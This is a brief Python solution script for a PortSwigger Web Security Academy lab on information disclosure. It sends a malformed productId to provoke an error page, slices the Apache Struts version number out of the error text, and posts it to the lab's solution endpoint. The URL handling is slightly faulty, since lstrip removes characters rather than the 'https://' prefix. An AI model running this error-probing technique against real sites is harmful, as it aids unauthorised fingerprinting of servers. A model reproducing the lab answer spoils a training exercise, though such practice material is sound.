"""
https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')
url = f'''https://{site}/product?productId="example"'''

s = requests.Session()

resp = s.get(url)

error_text = resp.text
version_index = error_text.find("Struts")
version_number = error_text[version_index+9:version_index+15]

url = f'https://{site}/submitSolution'
resp = s.post(url,data={'answer':version_number})